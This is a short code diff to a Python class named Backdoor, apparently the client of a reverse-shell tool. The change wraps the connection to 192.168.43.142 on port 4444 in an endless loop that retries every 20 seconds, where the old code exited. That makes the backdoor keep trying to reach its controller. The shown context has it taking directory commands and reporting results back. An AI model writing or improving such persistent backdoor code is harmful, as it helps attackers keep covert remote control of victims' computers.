@@ -94,9 +94,9 @@ class Backdoor:
             except FileNotFoundError:
                 self.json_send("[-] Directory Not Found")
 
-
-try:
-    my_backdoor = Backdoor("192.168.43.142", 4444)
-    my_backdoor.run()
-except Exception:
-    sys.exit()
+while True:
+    try:
+        my_backdoor = Backdoor("192.168.43.142", 4444)
+        my_backdoor.run()
+    except Exception:
+        time.sleep(20)
